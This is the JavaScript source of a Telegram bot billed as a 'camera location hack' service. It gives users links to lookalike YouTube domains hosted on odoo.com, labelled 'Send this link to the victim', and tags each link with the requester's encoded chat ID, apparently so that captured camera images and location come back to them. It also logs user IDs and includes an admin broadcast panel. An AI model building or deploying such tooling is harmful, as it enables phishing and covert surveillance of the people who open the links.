const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const fs = require('fs');
const path = require('path');

// Environment variables
const token = process.env.BOT_TOKEN;
const ADMIN_ID = process.env.ADMIN_ID;
const PORT = process.env.PORT || 4000;

// Initialize bot and express app
const bot = new TelegramBot(token, { polling: true });
const app = express();

// Data for bot
const linkData = [
  {
    name: "📷 camera hack 📷",
    links: [{ text: "🌍 Costam domen =  ❤️ YouTube ❤️ Send this link to the victim", value: "https://youthub-video.odoo.com/" }]
  },
  {
    name: "🌍 location 🌍",
    links: [{ text: "Costam domen =  ❤️ YouTube ❤️ Send this link to the victim", value: "https://y0uthub-c0m-vide0.odoo.com/1-1/" }]
  }
];

// Utility functions
function encodeBase64(text) {
  return Buffer.from(text.toString()).toString('base64');
}

function generateMainMenu() {
  return linkData.map(item => ({ text: item.name, callback_data: `menu_${item.name}` }));
}

function saveChatId(chatId) {
  try {
    let chatIds = [];
    if (fs.existsSync('users.txt')) {
      chatIds = fs.readFileSync('users.txt', 'utf8').split('\n').filter(id => id);
    }
    if (!chatIds.includes(chatId.toString())) {
      fs.appendFileSync('users.txt', chatId + '\n');
    }
  } catch (err) {
    console.error('Error saving chat ID:', err);
  }
}

// Bot commands
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  saveChatId(chatId);
  const menu = generateMainMenu().map(a => [{ text: a.text, callback_data: a.callback_data }]);
  await bot.sendMessage(chatId, "🎉 Welcome to the camera location hack Bot! Choose an option below:", {
    reply_markup: { inline_keyboard: menu }
  });
});

bot.on('callback_query', async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;

  if (data.startsWith('menu_')) {
    const buttonName = data.replace('menu_', '');
    const buttonData = linkData.find(b => b.name === buttonName);
    if (!buttonData) return bot.sendMessage(chatId, "Button not found.");

    const encodedChatId = encodeBase64(chatId);
    let message = `🔗 *Links for ${buttonName}:*\n\n`;

    buttonData.links.forEach(link => {
      const modifiedLink = `${link.value}?i=${encodedChatId}`;
      message += `🔹 ${link.text}: ${modifiedLink}\n\n`;
    });

    await bot.sendMessage(chatId, message, {
      parse_mode: 'Markdown',
      reply_markup: { inline_keyboard: [[{ text: "🔙 Back", callback_data: "back_to_main" }]] }
    });
  } else if (data === 'back_to_main') {
    const menu = generateMainMenu().map(a => [{ text: a.text, callback_data: a.callback_data }]);
    await bot.sendMessage(chatId, "🎉 Welcome to the camera location hack bot! Choose an option below:", {
      reply_markup: { inline_keyboard: menu }
    });
  }
});

// Admin commands
const broadcastStates = new Map();

bot.onText(/\/admin/, async (msg) => {
  const chatId = msg.chat.id;
  if (chatId.toString() === ADMIN_ID) {
    const users = fs.readFileSync('users.txt', 'utf8').split('\n').filter(id => id);
    const adminMenu = {
      reply_markup: {
        inline_keyboard: [
          [{ text: "📊 Total Users", callback_data: "admin_users" }],
          [{ text: "📢 Broadcast Message", callback_data: "admin_broadcast" }],
          [{ text: "📥 Download Chat IDs", callback_data: "admin_download_chat_ids" }]
        ]
      }
    };
    await bot.sendMessage(chatId, `🔐 Admin Panel\nTotal Users: ${users.length}`, adminMenu);
  }
});

bot.on('callback_query', async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;

  if (chatId.toString() === ADMIN_ID) {
    if (data === 'admin_users') {
      const users = fs.readFileSync('users.txt', 'utf8').split('\n').filter(id => id);
      await bot.sendMessage(chatId, `📊 Total Users: ${users.length}\n\nUser IDs:\n${users.join('\n')}`);
    } else if (data === 'admin_broadcast') {
      broadcastStates.set(chatId, true);
      await bot.sendMessage(chatId, '📢 Send your broadcast message (text, image or video):');
    } else if (data === 'admin_download_chat_ids') {
      const filePath = path.join(__dirname, 'users.txt');
      await bot.sendDocument(chatId, filePath);
    }
  }
});

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;

  if (chatId.toString() === ADMIN_ID && broadcastStates.get(chatId)) {
    broadcastStates.delete(chatId);
    const users = fs.readFileSync('users.txt', 'utf8').split('\n').filter(id => id);

    let successCount = 0;
    let failCount = 0;

    for (const userId of users) {
      try {
        if (msg.text) {
          await bot.sendMessage(userId, msg.text);
        } else if (msg.video) {
          await bot.sendVideo(userId, msg.video.file_id, { caption: msg.caption });
        } else if (msg.photo) {
          await bot.sendPhoto(userId, msg.photo[msg.photo.length - 1].file_id, { caption: msg.caption });
        }
        successCount++;
      } catch (err) {
        failCount++;
      }
    }

    await bot.sendMessage(chatId, `📢 Broadcast completed!\nSuccess: ${successCount}\nFailed: ${failCount}`);
  }
});

// Express server
app.get('/', (req, res) => {
  res.send('Bot is running!');
});

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
